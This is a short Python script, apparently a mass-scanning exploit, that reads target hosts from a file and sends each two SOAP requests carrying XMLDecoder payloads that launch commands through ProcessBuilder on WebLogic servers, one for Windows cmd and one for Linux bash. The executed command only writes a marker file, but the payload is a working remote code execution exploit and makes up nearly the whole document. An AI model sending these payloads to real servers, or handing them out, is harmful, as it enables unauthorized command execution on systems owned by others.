#/usr/bin/bash
#jackson

import requests
import sys

file = open("host.txt","r")

def file_call():
	lines = file.readlines()
	for line in lines:
		line = line.replace("\n","")
		url = "http://" + line
		attack(url)
		
def attack(url):
	vuln_url = url
	print "\n>>>>The Vuln Url: %s \n" % vuln_url

	payload = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
	<soapenv:Header> 
	<wsa:Action>xx</wsa:Action>
	<wsa:RelatesTo>xx</wsa:RelatesTo>
	<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
	<java version="1.8.0_151" class="java.beans.XMLDecoder">
	<void class="java.lang.ProcessBuilder">
	  <array class="java.lang.String" length="3">
		<void index = "0">
		  <string>cmd</string>
		</void>
		<void index = "1">
		  <string>/c</string>
		</void>
		<void index = "2">
		  <string>echo weblogicattack > attack.txt</string>
		</void>
	  </array>
	  <void method="start"/>
	</void>
	</java>
	</work:WorkContext>
	</soapenv:Header>
	<soapenv:Body>
	<asy:onAsyncDelivery/>
	</soapenv:Body>
	</soapenv:Envelope>'''

	payload_2 = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
	<soapenv:Header> 
	<wsa:Action>xx</wsa:Action>
	<wsa:RelatesTo>xx</wsa:RelatesTo>
	<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
	<java version="1.8.0_151" class="java.beans.XMLDecoder">
	<void class="java.lang.ProcessBuilder">
	  <array class="java.lang.String" length="3">
		<void index = "0">
		  <string>/bin/bash</string>
		</void>
		<void index = "1">
		  <string>-c</string>
		</void>
		<void index = "2">
		  <string>echo weblogicattack > attack.txt</string>
		</void>
	  </array>
	  <void method="start"/>
	</void>
	</java>
	</work:WorkContext>
	</soapenv:Header>
	<soapenv:Body>
	<asy:onAsyncDelivery/>
	</soapenv:Body>
	</soapenv:Envelope>'''

	headers = {
	'Content-Type': "text/xml",
	'User-Agent' : ''
	}

	response_win= requests.request("POST", vuln_url, data=payload, headers=headers)
	response_linux= requests.request("POST", vuln_url, data=payload_2, headers=headers)

	#print("%s/_async/favicon.ico") % url
	print "%s : %s\t%s\t%s" %("response_win", vuln_url,response_win.status_code, response_win.reason)
	print "%s : %s\t%s\t%s" %("response_linux", vuln_url,response_linux.status_code, response_linux.reason)

if __name__ == "__main__":
	file_call()
	
